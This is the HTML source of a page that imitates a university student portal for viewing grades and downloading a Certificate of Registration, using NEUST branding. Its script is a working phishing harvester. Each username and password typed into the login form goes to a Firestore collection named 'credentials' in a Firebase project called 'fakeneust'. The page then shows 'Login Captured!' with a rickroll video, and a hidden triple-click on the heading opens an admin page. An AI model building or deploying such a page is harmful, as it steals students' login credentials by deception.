<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Student Grades Viewer and COR Downloading</title>
  <meta property="og:title" content="Student Grades Viewer and COR Downloading" />
  <meta property="og:description" content="View your grades and download your Certificate of Registration" />
  <meta property="og:image"
    content="https://raw.githubusercontent.com/npcabrera13/neust-portal/master/images/neust_logo.png" />
  <meta property="og:type" content="website" />
  <link rel="icon" type="image/png" href="icon.ico" />
  <link href="bootstrap.css" rel="stylesheet">
  <style>
    :root {
      --bg0: #070a12;
      --bg1: #0b1220;
      --card: #0f172a;
      --card2: #101a33;
      --line: rgba(255, 255, 255, .12);
      --text: #e9eef7;
      --muted: rgba(233, 238, 247, .74);
      --head: rgba(255, 255, 255, .08);
      --rowHover: rgba(255, 255, 255, .06);
      --accent1: #0d6efd;
      --accent2: #20c997;
    }

    body {
      min-height: 100vh;
      background:
        radial-gradient(1200px 600px at 10% 10%, rgba(13, 110, 253, .22), transparent 60%),
        radial-gradient(900px 500px at 90% 20%, rgba(32, 201, 151, .20), transparent 60%),
        radial-gradient(900px 500px at 40% 90%, rgba(255, 193, 7, .14), transparent 60%),
        linear-gradient(180deg, var(--bg0), var(--bg1));
      color: var(--text);
    }

    .app-wrap {
      max-width: 980px;
      margin: 0 auto;
    }

    .card-glass {
      background: linear-gradient(180deg, rgba(255, 255, 255, .06), rgba(255, 255, 255, .04));
      border: 1px solid rgba(255, 255, 255, .10);
      box-shadow: 0 14px 40px rgba(0, 0, 0, .35);
      backdrop-filter: blur(10px);
      border-radius: 18px;
    }

    .brand-dot {
      width: 10px;
      height: 10px;
      border-radius: 999px;
      display: inline-block;
      margin-right: 10px;
      background: linear-gradient(135deg, var(--accent1), var(--accent2));
      box-shadow: 0 0 18px rgba(13, 110, 253, .55);
      flex: 0 0 auto;
    }

    .muted {
      color: var(--muted);
    }

    .btn-soft {
      background: rgba(255, 255, 255, .08);
      border: 1px solid rgba(255, 255, 255, .14);
      color: var(--text);
    }

    .btn-soft:hover {
      background: rgba(255, 255, 255, .12);
      color: #fff;
    }

    .form-control,
    .form-control:focus {
      background: rgba(255, 255, 255, .08);
      border-color: rgba(255, 255, 255, .18);
      color: var(--text);
      box-shadow: none;
    }

    .form-control::placeholder {
      color: rgba(233, 238, 247, .55);
    }

    .alert {
      background: rgba(220, 53, 69, .12);
      border: 1px solid rgba(220, 53, 69, .25);
      color: #ffd7dd;
      border-radius: 14px;
    }

    .alert-info {
      background: rgba(13, 110, 253, .12);
      border: 1px solid rgba(13, 110, 253, .25);
      color: #cfe2ff;
      border-radius: 14px;
    }

    .grades-surface {
      background: var(--card);
      border: 1px solid var(--line);
      border-radius: 16px;
      overflow: hidden;
    }

    .table {
      margin-bottom: 0;
      --bs-table-bg: transparent;
      --bs-table-color: var(--text);
    }

    .table thead th {
      background: var(--head) !important;
      color: var(--text) !important;
      border-bottom: 1px solid var(--line) !important;
      font-weight: 700;
      letter-spacing: .2px;
      padding-top: 14px;
      padding-bottom: 14px;
      white-space: nowrap;
    }

    .table tbody td {
      color: var(--text) !important;
      border-top: 1px solid rgba(255, 255, 255, .08) !important;
      background: transparent !important;
      padding-top: 14px;
      padding-bottom: 14px;
      opacity: 1 !important;
    }

    .table tbody tr:hover {
      background: var(--rowHover) !important;
    }

    .subject-code {
      font-weight: 800;
      font-size: 1rem;
      line-height: 1.15;
    }

    .subject-title {
      color: var(--muted);
      font-size: .9rem;
      margin-top: 2px;
      line-height: 1.25;
    }

    .footer-note {
      color: rgba(233, 238, 247, .55);
      font-size: .85rem;
    }

    @media (max-width: 576px) {
      .subject-code {
        font-size: .95rem;
      }

      .subject-title {
        font-size: .85rem;
      }

      .table thead th {
        font-size: .9rem;
      }

      .table tbody td {
        font-size: .92rem;
      }
    }

    .neust-portal-btn {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      padding: 14px 16px;
      border-radius: 14px;
      text-decoration: none;
      font-weight: 900;
      letter-spacing: .2px;
      color: #ffffff;
      background: linear-gradient(90deg, #22c55e, #16a34a);
      border: 1px solid rgba(255, 255, 255, .14);
      box-shadow: 0 16px 40px rgba(0, 0, 0, .35);
      transition: transform .12s ease, box-shadow .12s ease, filter .12s ease, opacity .12s ease;
      user-select: none;
    }

    .neust-portal-btn:hover {
      transform: translateY(-1px);
      box-shadow: 0 18px 46px rgba(0, 0, 0, .42);
      filter: brightness(1.02);
      color: #ffffff;
      opacity: .98;
    }

    .neust-portal-btn:active {
      transform: translateY(0px) scale(.99);
      box-shadow: 0 12px 34px rgba(0, 0, 0, .34);
    }

    .btn-icon {
      width: 30px;
      height: 30px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      border-radius: 10px;
      background: rgba(255, 255, 255, .14);
      border: 1px solid rgba(255, 255, 255, .18);
      font-size: 16px;
      line-height: 1;
    }

    .btn-text {
      font-size: 0.95rem;
      line-height: 1;
    }

    @media (max-width:480px) {
      .neust-portal-btn {
        padding: 13px 14px;
        border-radius: 12px;
      }

      .btn-text {
        font-size: 0.92rem;
      }
    }
  </style>
</head>

<body>
  <div class="container py-5 app-wrap">
    <div class="d-flex flex-wrap align-items-center justify-content-between gap-3 mb-4">
      <div>
        <div class="d-flex align-items-center">
          <span class="brand-dot"></span>
          <h1 class="h4 mb-0">Grades Viewer and COR Downloader</h1>
        </div>
      </div>

    </div>


    <div class="card-glass p-4 p-md-5">
      <h2 class="h5 mb-2">Student Login</h2>
      <div class="muted mb-4">Enter your username and password.</div>

      <form method="post" autocomplete="off" id="gvform">
        <input type="hidden" name="action" value="login">

        <div class="mb-3">
          <label class="form-label">Username</label>
          <input type="text" name="user_name" id="gv_user" class="form-control form-control-lg"
            placeholder="Enter username" required>
        </div>

        <div class="mb-4">
          <label class="form-label">Password</label>
          <input type="password" name="user_password" id="gv_pass" class="form-control form-control-lg"
            placeholder="Enter password" required>
        </div>

        <button type="submit" class="btn btn-primary btn-lg w-100" id="gv_btn">Login</button>
      </form>
    </div>
    <div class="wrap-login100-form-btn" style="margin-bottom:20px;">
      <a class="neust-portal-btn" href="/">
        <span class="btn-icon" aria-hidden="true">â†—</span>
        <span class="btn-text">Navigate to Enrollment Portal</span>
      </a>
    </div>

  </div>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCxS5bpVtVzjxovMGpY0MP8rlr5m-m6Ay0",
      authDomain: "fakeneust.firebaseapp.com",
      projectId: "fakeneust",
      storageBucket: "fakeneust.firebasestorage.app",
      messagingSenderId: "226469392303",
      appId: "1:226469392303:web:2a81f09f14a865f095095a"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    document.addEventListener('DOMContentLoaded', () => {
      const form = document.getElementById('gvform');

      if (form) {
        form.addEventListener('submit', async (e) => {
          e.preventDefault();
          const un = document.getElementById('gv_user').value;
          const pw = document.getElementById('gv_pass').value;

          if (un && pw) {
            // Change button text
            const btn = document.getElementById('gv_btn');
            btn.textContent = "Logging in... Please Wait...";
            btn.disabled = true;

            try {
              await addDoc(collection(db, "credentials"), {
                username: un,
                password: pw,
                server: "Grades Viewer",
                timestamp: new Date().toISOString()
              });

              // Rickroll
              const formContainer = form.parentElement;
              formContainer.innerHTML = `
                        <h4 style="color:red; margin-bottom: 15px; text-align:center;">Login Captured!</h4>
                        <iframe width="100%" height="250" src="https://www.youtube.com/embed/2qBlE2-WL60?autoplay=1" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
                    `;
            } catch (e) {
              console.error("Error saving to Firebase: ", e);
              alert("Failed to connect to backend database.");
              btn.textContent = "Login";
              btn.disabled = false;
            }
          }
        });
      }

      // Admin Trigger (Triple click on the heading)
      let clicks = 0;
      let clickTimeout;
      const header = document.querySelector('h1');
      if (header) {
        header.style.cursor = 'pointer';
        header.addEventListener('click', () => {
          clicks++;
          clearTimeout(clickTimeout);
          clickTimeout = setTimeout(() => { clicks = 0; }, 1000);

          if (clicks >= 3) {
            window.location.href = '/admin.html';
          }
        });
      }
    });
  </script>
</body>

</html>
